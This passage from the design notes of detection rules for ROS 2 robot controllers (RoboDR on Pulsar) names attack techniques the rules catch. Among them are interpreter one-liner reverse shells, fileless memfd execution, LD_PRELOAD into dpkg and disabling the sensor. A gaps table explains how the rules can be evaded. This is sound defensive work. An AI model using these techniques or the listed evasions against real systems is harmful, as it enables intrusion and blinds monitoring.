| Process memory written through `/proc` | Code injection into a running node (T1055.009). Covers part of the ptrace idea. | gdb. Pulsar's upstream rule already covers *reads* of `/proc/*/mem` at low severity. |
| Debugger or tracer started | ptrace-based key theft or patching (Pulsar has no ptrace event) | Field debugging sessions, which should not happen on a fielded unit. |
| Program executed from a file descriptor or /proc path | memfd / `fexecve` fileless payloads, `/proc/self/exe` re-exec that escapes path scopes | systemd >= 255 unit starts from PID 1 and from the user managers of the TUNE uid list (excluded; spoofable, see table above), root's own user manager, runc. |
| Program executed through a non-canonical path | `//opt/ros/...`, `/usr/../tmp/x`: respelt exec paths that dodge scopes and prefixes | Shell scripts that exec `$(dirname "$0")/../bin/x`. |
| ROS 2 process imported Python code from outside allowlisted paths | `PYTHONPATH` / `sitecustomize` / `.pth` / user site-packages hook inside an rclpy node or the `ros2` CLI | Python run on scripts outside the allowlisted trees; robot Python packages outside them (TUNE). |
| Interpreter one-liner executed | `python3 -c` pty upgrade, `perl -e` reverse shell | Helper scripts using `python3 -c` (maintainer scripts using `perl -e` during apt), 2 of 19 CMake 3.28 FindPython probes during `colcon build` (17 excluded by exact argv), other CMake versions' probes; rare `python3 -E` / `node -r`. Unverified: whether the `ros2` CLI spawns its daemon with `python3 -c` on the robot's distro (check during commissioning). |
| Interactive or stdin-fed Python interpreter started | REPL / stdin code inside an interpreter (pty upgrade, `PYTHONINSPECT`-style prompt) | Interactive debugging on the unit. py3compile's `-m py_compile -` worker excluded. |
| Pseudo-terminal wrapper executed | `script -qc` / `expect` / `unbuffer` giving a pty to a trusted interpreter (`PYTHONINSPECT`), pty upgrades | Terminal multiplexers used by operators (should not exist on a fielded unit). |
| Package manager loaded a library / mapped an ELF from outside the system paths (2 rules) | `LD_PRELOAD` into the real dpkg to borrow the image every write rule trusts | `dpkg --verify` of packages that ship ELF/.so outside the system and `/opt/ros` trees. |

### `supply_chain.toml`: trojaned package (Sakib et al. 2025; supply chain)

| Rule | Threat | False positives / notes |
|---|---|---|
| Debian package installed on robot controller | Trojaned `.deb` | Authorised maintenance. The alert is then the audit trail. `apt` also runs `dpkg --unpack`, so one install raises two hits. Known gap: bundled flags (`-iE`) and `--install=` forms are missed (a fixture documents this). |
| Package maintainer script executed | Malicious `postinst` / `preinst` running as root | Every legitimate install or remove. Pair it with a maintenance-window record. |
| Debian package database changed | Backstop for renamed or unrecognised dpkg front-ends | Same. |
| Python package installed | Trojaned wheel / typosquat | Commissioning-time `pip install`, which should be built into the image instead. |
| Python package installed with uv, pipx, poetry or conda/mamba | Same, through the other installers (`uv pip install --system`, `pipx --global`, poetry/conda against the system interpreter), plus fetch-and-run (`uvx`, `pipx run`, `uv tool run`); also `python3 -m <tool>` | Developer tooling on a non-fielded unit. The target environment is not visible in argv; the file rules below show whether the system/ROS environment changed. |
| Node.js package installed with npm, npx, pnpm or yarn | Trojaned npm package (global install into `/usr/lib/node_modules`, lifecycle scripts as root), `npx` fetch-and-run | rosbridge / web-dashboard maintenance. |
| File created / moved / linked into the system or ROS Python environment (3 rules) | Backstop by effect for every installer, renamed or not: new files in `/usr/lib/python3*`, `/usr/local/lib/python3*`, `/usr/lib64/python3*`, `/etc/python3*` (Debian `sitecustomize`), and any `site-packages`/`dist-packages` under `/usr` or `/opt/ros`. The link rule catches uv and conda, which install by hard link | py3compile during apt and root-run Python writing `__pycache__` (deliberately not excluded; precompile at commissioning). Overlaps on purpose with the system-library and ROS-install-tree rules; one install raises one alert per file. |

### `radio_provisioning.toml`: BLE / Wi-Fi provisioning (UniPwn 2025)

Pulsar does not see Bluetooth sockets or HCI. These rules watch the user-space
tools and the configuration files instead.

| Rule | Threat | False positives / notes |
|---|---|---|
| Bluetooth tooling executed | A wormed robot scanning or attacking nearby robots over BLE | A vendor provisioning service that shells out to `bluetoothctl`. Confirm this during commissioning and exclude it by `header.image`. |
| Wi-Fi configuration tooling executed | Joining an attacker AP / becoming an AP | `nmcli` called by NetworkManager dispatcher scripts. `iw` used by a link-monitoring script. |
| Wireless network configuration modified | Persisted rogue SSID/PSK | Legitimate re-provisioning. NetworkManager writes connection files itself when connections change. |
| Wireless network configuration moved into or out of place | Same via `mv` (content written elsewhere) | Same (NetworkManager saves by temp-and-rename). |
| Link created in a wireless network configuration directory | Same via symlink / hard link | Re-provisioning tools that link configs. |

### `kernel_modules.toml`: rootkits / captured unit

| Rule | Threat | False positives / notes |
|---|---|---|
| Kernel module file written outside dpkg | Rootkit staging (also catches loaders that call `finit_module` directly and drop a `.ko`) | DKMS rebuilds after kernel updates. update-initramfs `cp` into its staging tree is excluded (table above). |
| Module autoload configuration changed | Boot persistence / blacklisting security modules | Non-dpkg driver installers. |
| Kernel module file or autoload configuration moved into place outside dpkg | The two above via rename (no create/write event on the target name) | Same. |
| Kernel module file or autoload configuration linked into place outside dpkg | The same via hard link, symlink or `O_TMPFILE`+`linkat` | Same. |

"dpkg" in every rule above means the exact image `/usr/bin/dpkg` or `/bin/dpkg`.

Pulsar's upstream `persistence/kernel_module_injection.toml` already covers
`insmod` and `modprobe` being run (high severity), so that is not duplicated
here.

### `self_protection.toml`: tampering with RoboDR / Pulsar

| Rule | Threat | False positives / notes |
|---|---|---|
Protected paths (all rules below; dpkg by exact image is excluded, so the
signed bundle installed with `dpkg -i` does not alert beyond the
supply-chain audit trail): `/etc/robodr`, `/etc/pulsar`, `/usr/share/robodr`
(the real `rules_path`), `/usr/sbin/robodr-pulsard`,
`/usr/sbin/robodr-agentd` (and `/sbin/` spellings), every `robodr-*` path
under `/usr/lib/systemd`, `/lib/systemd`, `/etc/systemd`,
`/run/systemd/system{,.control}` and `/run/systemd/transient` (units,
`*.service.d` drop-ins, `*.wants` enablement links, `mask` links,
`set-property` drop-ins), and the top-level `service.d` drop-in
directories, which apply to every service.

| Rule | Threat | False positives / notes |
|---|---|---|
| Protected file written / deleted (2 rules) | Widening the locked profile; deleting or editing rules so detection is blind after restart; overwriting a daemon binary or unit | Operator edits and `systemctl edit` (the audit trail); a future non-dpkg update agent (exclude by exact image). |
| Protected file or directory renamed | Atomic replacement of profile, rule file, unit or daemon; moving `/etc/pulsar`, `/etc/robodr` or `/usr/share/robodr/rules` away as a whole | Same. |
| File or device node created in a protected path | `mkfifo`/`mknod` in the rules directory (engine hangs at start), new rule files, override units, drop-in `.conf` files | Same; also robodr-commission writing keys under `/etc/robodr/keys`. |
| Link created in or to a protected path | Symlink rule file -> `/dev/null`; `systemctl mask`; enablement links; hard-link alias of a protected file | `systemctl enable` at commissioning (PID 1 makes the link). PID 1's own `/run/systemd/units/invocation:*` links do not match. |
| Directory created in a protected path | New `robodr-*.service.d` / `service.d` / `system.control` drop-in directory that precedes an override | `systemctl edit` / `set-property` by an operator; systemd-tmpfiles recreating a deleted `/etc/robodr/keys`. |
| Protected directory deleted | Last step of a recursive delete of rules, config or drop-in directories | Operator clean-up. |
| Attempt to stop the Pulsar or RoboDR service | `systemctl stop/disable/mask/kill/freeze/set-property/edit`, `service ... stop`, `pkill`/`killall` against `robodr-pulsard`, `robodr-agentd` (with or without `.service`) or an upstream Pulsar unit | The package prerm on **removal** (upgrade only `try-restart`s); planned maintenance. |

### Residual gaps of the self-protection and installer rules (summary)

Detail is deliberately kept at this level; the fixtures marked `KNOWN GAP`
record the concrete cases.

| Gap | Why | Mitigation |
|---|---|---|
| Stop by PID, unit glob or unlisted verb/spelling | argv is matched per whole element; no glob or PID context | Sensor heartbeat at the SOC; systemd `RefuseManualStop=` where acceptable |
| Rename or bind-mount of an *ancestor* directory (`/usr/share`, `/etc/systemd/system`) | Rules match the protected paths, not every parent | Read-only `/usr`; no unprivileged user namespaces |
| `chmod`/`chown`/`chattr`, `truncate(2)` by path, writes through an fd opened before pulsard started | No Pulsar hook (see above) | Heartbeat; file integrity check at boot |
| Unit behaviour changed from outside the protected paths (e.g. generators, `/etc/environment`, global systemd config) | Not robodr-named paths | Out of scope here; covered only by general persistence rules |
| Installer launched under another name or through its interpreter with an unlisted form | Exec rules match tool names and whole argv elements | The site-packages file rules (by effect) |
| Packages installed into environments outside the watched trees (venv, conda prefix, user site) | Not the system/ROS environment | Python-import rule fires when a ROS process imports from there |
| Env-var influence on an excluded or allow-listed command (interpreter variables, installer config) | Pulsar does not capture the environment | Env-capture follow-up (below) |
| FindPython-excluded commands run with interpreter environment variables set | Exact argv says nothing about the environment | Pty-wrapper / login-shell / Python-import rules; env-capture follow-up |
| Pre-existing dpkg trust | dpkg (exact image) is excluded everywhere | Supply-chain rules record every install; `LD_PRELOAD`-into-dpkg rules |

## Commissioning: tuning per robot

1. Set the TUNE values: prefixes, subnets, RMW and service names.
2. Run the robot through its full mission profile in **observe mode** with all
   rules enabled. Record every hit.
3. For each hit, either fix the robot (precompile `.pyc`, remove tools, run
   nodes unprivileged) or add a **narrow** exclusion. A narrow exclusion means
   a `header.image` equality or prefix, never a broad directory.
4. Re-run `scripts/validate_rules.py` and update the fixtures with the new
   exclusions.
5. Lock the rule set together with the model profile, and do the 72-hour clean
   run to measure the false-positive rate (Sprint 4, E1/E2).

## What was wrong with `robot.toml`

* Every rule lacked `severity` and `description`, and every rule used
  `category = "robotics"`. Any one of these makes the **entire** rules-engine
  module fail to start, Pulsar's own rules included.
* "Controller spawns a shell": the rule used `header.image STARTS_WITH
  "/opt/ros"` on an `Exec` event. On `Exec`, `header.image` is the new shell,
  not the parent, so the rule could never match. It also compared
  `payload.filename` against `/bin/sh` exactly, which misses `/usr/bin/bash`.
  The rule was replaced by the interactive-shell rule, and the "spawned by ROS"
  part is a follow-up.
* "Outbound connection": the rule used `payload.destination.ip STARTS_WITH "10."`,
  but `IpAddr` has no `STARTS_WITH`, so it would not compile. It now uses ranges.
* "Write to ROS 2 launch or params directory": `FileCreated` fires only on new
  files, not on overwrites. The rule also did not exclude dpkg. It now uses
  `FileOpened` with write flags plus `FileRename`.
* "Reverse shell pattern": the argv use was correct (`CONTAINS` is valid on
  `Argv`), but the filename used `==` against two paths. It is folded into the
  interactive-shell rule with `ENDS_WITH`.

## Still unverified until run on a real Pulsar daemon

The harness proves that the rules **load, compile and match the intended sample
events under the engine's semantics**. It does **not** prove what the kernel
probes emit. The following need checking on the target controller, with
`pulsard` running and the real ROS distro installed:

* Exact path strings from `get_path_str` for `/proc/<pid>/mem`, `/dev/shm`,
  overlay or bind mounts, and **inside containers**. A ROS stack in Docker
  would see container-relative paths, and `header.image` would be the
  in-container path.
* That glibc's loader opens `LD_PRELOAD` libraries and `/etc/ld.so.preload` in
  a way `security_file_open` reports with the expected path. The same applies
  to `rmw_implementation`'s `dlopen` of `librmw_*.so`, and to the RMW library
  names for the robot's distro.
* That the DDS security plugin (Fast DDS / Cyclone) reads `key.pem` from the
  node process, so that `header.image` is the node binary.
* That dpkg's `header.image` is exactly `/usr/bin/dpkg` (apt's default
  `Dir::Bin::dpkg`) or `/bin/dpkg` on the target, so the exact-path exclusions
  do not turn every package install into alerts. A process that was already
  running when pulsard started gets its image from `/proc/<pid>/exe`
  (resolved, i.e. `/usr/bin/dpkg` on usr-merged systems).
* That `ElfOpened` (derived event) reaches the rules engine with the original
  header, and the cost of `elf_check = true` on the controller.
* That dpkg maintainer-script exec events carry `/var/lib/dpkg/info/...` as
  `filename`, and that dpkg's `.list-new` → `.list` rename is reported as
  `FileRename`.
* Whether `security_path_mknod` → `FileCreated` fires for `.ko` files written
  by `cp` / `curl` (expected: yes, through `open(O_CREAT)`).
* The maintenance tool behaviour the exclusions and the benign corpus
  assume: initramfs-tools' staging prefix (`mkinitramfs_`), that it copies
  with `cp` and runs `depmod -b`, `ldconfig -r` and `cpio` by those exact
  paths under apt's `PATH`, kmod depmod's `modules.*.tmp` + rename, and
  `launch_ros` writing dict parameters to `/tmp/launch_params_*`. Checked
  locally: ldconfig's unlink+symlink (strace, Ubuntu 24.04), py3compile's
  `python3.X -m py_compile -` worker (source), CMake 3.28 FindPython probes
  (source). The `PYTHONINSPECT` path needing a pty is the reviewer's repro.
* The systemd and installer behaviour the self-protection and installer
  rules assume: that PID 1 (image `/usr/lib/systemd/systemd`) makes the
  `enable`/`mask` links and `set-property` drop-ins, the paths of its
  per-start `/run/systemd/units/invocation:*` links, `/run/systemd/propagate/`
  and `/run/credentials/` directories, that dpkg replaces the daemons and
  units via `.dpkg-new` + rename, and that uv and conda install by hard link
  on the target file system. These are modelled from documentation and
  source, not captured from pulsard.
* Event volume. The library-load rules evaluate on every `FileOpened` event.
  Measure CPU on the controller.
* The false-positive rate on the real robot over a 72-hour clean run.

## Follow-ups that need fields or events Pulsar does not have

| Idea | Missing in Pulsar | Possible path |
|---|---|---|
| Shell or interpreter **spawned by a ROS node** | Parent image on `Exec` (only `parent_pid`). `ProcessTracker::is_descendant_of` exists but is not exposed to the DSL. | Add a `header.parent_image` / ancestry method upstream, or a RoboDR module that checks ancestry and emits a threat. |
| `LD_PRELOAD=` / `RMW_IMPLEMENTATION=` / `ROS_SECURITY_*` / `PYTHONINSPECT=` / `PYTHONSTARTUP=` in the environment at exec | Exec env (`envp` is not captured by `probes.bpf.c`) | Extend the process-monitor probe to capture selected env keys. |
| ptrace attach to ROS nodes | No ptrace / `process_vm_writev` event | LSM `ptrace_access_check` hook in a new probe. |
| Kernel module load by syscall | No `init_module` / `finit_module` event | LSM `kernel_module_request` / `kernel_read_file` hook. |
| BLE / HCI activity | Network monitor is IP-only | Bluetooth socket probe, or the RoboDR network sensor. |
| Robotics category in the threat itself | `Category` enum is fixed | Use the `RoboDR: ` name prefix (current approach), or an upstream enum extension. |
| Time-boxed maintenance windows | Rules have no time or state | Suppress at the SOC/bridge, not in rules. |
| Rate limiting (for example the ld.so.preload rule on every node start) | None in the engine | Dedupe in threat-logger / bridge. |
